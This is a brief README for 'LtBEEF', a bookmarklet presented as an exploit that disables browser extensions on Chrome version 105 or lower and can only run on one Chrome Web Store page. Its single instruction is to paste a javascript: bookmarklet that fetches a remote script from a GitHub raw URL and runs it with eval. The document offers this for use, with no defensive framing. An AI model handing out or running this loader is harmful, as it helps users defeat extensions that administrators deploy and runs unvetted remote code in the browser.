LtBEEF (Literally the Best Exploit Ever Found) is a bookmarklet utility that allows you to disable extensions on v105 or lower. To use it, copy and paste the below text into a new bookmark:

```
javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
```

This bookmarklet can only be run on [this specific page](https://chrome.google.com/webstorex) due to the nature of the exploit.
